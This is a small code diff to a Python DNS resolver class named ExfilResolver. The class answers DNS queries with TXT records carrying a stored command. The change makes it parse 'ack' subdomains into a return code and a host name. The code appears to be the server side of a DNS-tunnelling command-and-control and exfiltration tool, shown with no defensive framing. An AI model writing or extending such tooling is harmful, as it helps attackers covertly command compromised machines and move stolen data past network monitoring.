@@ -88,10 +88,12 @@ class ExfilResolver(BaseResolver):
         print(qname)
         if len(qname.split(".")) > 2:
             if qname.split(".")[-2] == "ack":
-                host = qname.split(".")[0]
-                print(qname.split("."))
+                retcode = qname.split(".")[0]
+                host = qname.split(".")[1]
+                print(host, retcode)
                 reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
             else:
+                # print(host, "listening")
                 reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
         else:
             reply.header.rcode = RCODE.NXDOMAIN
